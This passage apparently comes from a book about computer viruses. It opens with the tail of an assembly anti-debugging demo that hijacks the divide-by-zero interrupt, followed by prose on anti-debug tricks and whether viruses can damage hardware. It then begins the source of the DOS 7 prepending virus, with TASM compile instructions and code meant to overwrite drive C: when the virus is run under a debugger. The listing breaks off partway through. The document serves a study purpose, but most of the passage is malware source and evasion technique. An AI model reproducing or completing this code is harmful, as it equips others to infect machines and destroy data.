&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;trap interrupt 0 (Divide by 0 error)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>orig_0<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>orig_2<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>offset untrick <span style="color: black; font-style: italic;">;INT 0 points to our routine</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;INT 0 segment now same as ours</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Invoke INT 0 error</span><br/>
<br/>
exit<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Ch</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;put all kinds of routines here</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
untrick<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;reset INT 0 to normal values</span><br/>
orig_0&nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
orig_2&nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;continue with program</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>it_worked<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short exit<br/>
it_worked &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'It Worked!$'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; trick<br/>
&nbsp;</div>
<p>The <strong>DOS 7</strong> virus implements this kind of technique, combined in such a way with the one described before it, that if the virus is debugged, drive C: will be overwritten. This is the most potent anti-debug method ever devised.
 
Before this technique was devised, programmers had only been able to cause the debugger to trace the incorrect code. This virus actually executes the code. This is a very dangerous, but highly effective anti-debugging routine with very good commercial potential. Besides being debug-resistant, disassemblers make errors with the code, rendering the code difficult to reverse engineer.</p>
<p>A very basic anti-debug tool is to trap INT 3 so as to execute INT 21h instead. First, this will cut code size down, since the INT 3 opcode is half the size of INT 21h command. Second, debuggers will lock up as soon as the first INT 3 is reached. Lucifer Messiah uses this technique extensively in his viruses.</p>
<p>There are many different techniques available. This book has barely scratched the surface by highlighting six of them. In different combinations and implementations, the results may be astounding.</p>
<h3><a name="pi4"></a>The Manipulation Task</h3>
<p>The world was warned to avoid using its computers on March 6th, 1992. On this day, the <strong>Michelangelo</strong> virus was supposedly set to self destruct, unleashing its guile on up to five million computers world-wide. Exactly a week later, the <strong>Friday the 13th</strong> virus was slated to go off, wreaking havoc in its wake. These are examples of the Manipulation Task.</p>
 
<p>After reading the horror stories, such as the fax machine or modem hoaxes described in Chapter two, one begins to wonder: Just how much damage is a virus <em>really</em> capable of achieving?</p>
<p>The answer: Not much, really.</p>
<p>Inadequate handling and preparation actually cause most of the damage and expense incurred in virus attacks. Many people rush in and re-format their drives when their hard-drive suddenly refuses to boot properly. In a lot of cases, the information is recoverable. If not, with well thought out procedures, recovering from the attack can be almost effortless. With good preparation, it is unlikely that any damage would result from an infection. Chapter Three contains information on data recovery after an attack. This chapter should be read thoroughly.</p>
<p>Following are three of the most common questions asked about virus manipulations. Some of the answers will be an interesting surprise.</p>
<h4><a name="pi41"></a>Will the Michelangelo Format My Hard drive?</h4>
<p>No. On March 6th the virus detonates, overwriting sectors on the boot drive. Overwriting is not the same as formatting, although the damage is similar enough.</p>
 
<h4><a name="pi42"></a>What Is the Worst Thing A Virus Can Do?</h4>
<p>This is a hard question to answer. It depends entirely on the victim. A virus could potentially allow its writer to access a private network. In this manner, the writer is what causes any damage, not the virus.</p>
<p>All virus attacks are recoverable. If information is deleted or is jumbled, then the victim should resort to using backup copies of the file. If backups are made often enough, damage will be extremely minimal.</p>
<p>Virus severity is too often weighed by how much of a hassle it is to recuperate the files directly from the disk. With good backups, no virus damage will ever be severe.</p>
<h4><a name="pi43"></a>Can a Virus Damage Hardware?</h4>
<p>Ralph Burger seems to believe this is possible. In his book, Burger lists a few code fragments which should be able to lock up a floppy drive, and tells how a monitor may be destroyed<sup><a href="#f76" name="b76">76</a></sup>. Nobody has yet written a virus or Trojan horse exhibiting either of these nefarious functions.</p>
<p>Old EGA monitors were apparently easy to burn out by forcing mode changes incorrectly; EGA is now obsolete. This is hardly something to worry about.</p>
 
<p>As for the floppy drives, many people all over the world have tried to do as Burger suggests. No documented cases have arisen where pushing the head beyond its limits has actually damaged a disk drive. Disk drives generally cannot push the read/write head farther than they are built to move.</p>
<p>Presently there seems to be only one technique that actually <em>does</em> destroy hardware. A virus using interrupt 13h, function 5 to format tracks (not delete them, as with most destructive viruses), can permanently destroy IDE hard drives. This is a large fault in the IDE architecture.</p>
<p>There have been reports of code that could potentially jam printers by feeding the paper backwards. This has not been confirmed. Considering its likelihood, this is probably another hoax.</p>
 
<h2><a name="pj"></a>Computer Virus Samples</h2>
<p>This chapter focuses solely on the programming of computer viruses. It is not written as tutelage for new and budding virus authors, but is an exposé into how viruses are actually programmed. There are many fine publications for those who wish to learn to program their own. Read the appendix for a small listing. The viruses in this chapter represent state-of-the-art virus strategies: basically those viruses which can be found in the wild.</p>
<h3><a name="pj1"></a>DOS 7</h3>
<p>The <strong>DOS 7</strong> virus is a basic prepending virus. It contains many of the anti-debug techniques mentioned in Chapter Five. When this file is compiled, do NOT use a debugger to study it. It will overwrite your hard drive.</p>
<p>The virus infects one .COM file in the default directory. The virus will alter the text inside DOS 6's COMMAND.COM if it is found. It cannot infect any files following COMMAND.COM.</p>
<p>It will be necessary to study Chapter Five to understand the coding at the beginning of the virus.</p>
 
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">COMMENT<br/>
~======================================================================<br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DOS<span style="color: #339933;">-</span><span style="color: #ff0000;">7</span> version C<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">---------------</span><br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Disassembly By<span style="color: #339933;">:</span> Karsten Johansson<span style="color: #339933;">,</span> PC Scavenger<br/>
=<br/>
=======================================================================<br/>
=<br/>
=<br/>
= &nbsp;CAUTION<span style="color: #339933;">:</span> &nbsp; This virus contains damaging <span style="color: #0000ff; font-weight: bold;">code</span><span style="color: #339933;">.</span> <span style="color: #0000ff; font-weight: bold;">Do</span> <span style="color: #00007f; font-weight: bold;">NOT</span> compile <span style="color: #00007f; font-weight: bold;">or</span><br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; execute the <span style="color: #0000ff; font-weight: bold;">code</span> until you understand the nature of the<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; anti<span style="color: #339933;">-</span>debugger methods used <span style="color: #00007f; font-weight: bold;">in</span> the virus<span style="color: #339933;">.</span><br/>
=<br/>
= &nbsp;NOTES<span style="color: #339933;">:</span> &nbsp; &nbsp; This virus is actively debugger<span style="color: #339933;">-</span>resistant<span style="color: #339933;">.</span> Use of a<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; debugger will cause the virus to overwrite sectors <span style="color: #ff0000;">0</span><br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; upwards on the C<span style="color: #339933;">:</span> drive<span style="color: #339933;">.</span> What makes this technique highly<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dangerous compared to other anti<span style="color: #339933;">-</span>debug techniques is that<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; instead of simply sending the debugger tracing the wrong<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; path<span style="color: #339933;">,</span> it forces the debugger to actually execute the disk<span style="color: #339933;">-</span><br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; writing routine<span style="color: #339933;">.</span><br/>
=<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; As of the time of this writing<span style="color: #339933;">,</span> no other virus uses this<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; technique<span style="color: #339933;">.</span><br/>
=<br/>
= &nbsp;COMPILE<span style="color: #339933;">:</span> &nbsp; With TASM<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TASM DOS<span style="color: #339933;">-</span>7C<br/>
= &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TLINK <span style="color: #339933;">/</span>T DOS<span style="color: #339933;">-</span>7C<br/>
=<br/>
=======================================================================<br/>
=<br/>
=<br/>
= &nbsp;BEFORE COMPILING THIS <span style="color: #0000ff; font-weight: bold;">CODE</span><span style="color: #339933;">,</span> IT MUST BE NOTED THAT THE AUTHOR <span style="color: #00007f; font-weight: bold;">AND</span><br/>
= &nbsp;PUBLISHER OF THIS BOOK CANNOT BE HELD LIABLE FOR ANY DAMAGES THAT<br/>
= &nbsp;MAY BE INCURRED BY THE USE OF <span style="color: #00007f; font-weight: bold;">OR</span> THE EXPERIMENTATION OF COMPUTER<br/>
= &nbsp;VIRUSES<span style="color: #339933;">.</span> THIS BOOK IS FOR EDUCATIONAL PURPOSES ONLY<span style="color: #339933;">.</span> EDUCATION IS<br/>
= &nbsp;<span style="color: #00007f; font-weight: bold;">NOT</span> HERE TO BE ABUSED<span style="color: #339933;">.</span><br/>
=<br/>
=<br/>
=======================================================================<br/>
~<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
<span style="color: black; font-style: italic;">; NOTE: The next 2 lines work as written in a debugger, but when</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; executed in DOS, the second line is skipped. There are quite a</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; few prefetch tricks in this code, as well as some recursive code</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; used to obfuscate the real intentions</span><br/>
<br/>
DOS_7<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span>offset AD_Marker <span style="color: #339933;">-</span> <span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>offset Kill_HD<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset Second_Entry&nbsp; <span style="color: black; font-style: italic;">;Prepare to overwrite HD</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if debugger is being used</span><br/>
<br/>
AD_Marker<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #b00040;">Prefetch</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;Store the offset</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; of our future INT 0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">21h</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;INT 3 = INT 21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; (See Chapter 5 for</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; explanation of this</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; technique)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Save INT 0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>Orig_0<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>Orig_2<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; <span style="color: black; font-style: italic;">;Point INT 0 to code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'ML'</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">; in our high segment</span><br/>
<span style="color: #b00040;">Prefetch</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">EQU</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br/>
<br/>
<span style="color: black; font-style: italic;">; NOTE: At this point, Interrupt 0 (automatically invoked by a divide-</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; by-zero error) is revectored to Second_Entry if a debugger isn't</span><br/>
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; being used, but to Anti_Debug if one is.</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ds</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;New segment is 65535</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; bytes above this one</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; (Max length for COMs)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>Host<span style="color: #339933;">-</span>DOS_7<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Move virus to new segment</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Invoke divide-by-0 error.</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Read notes above for</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; explanation.</span><br/>
<br/>
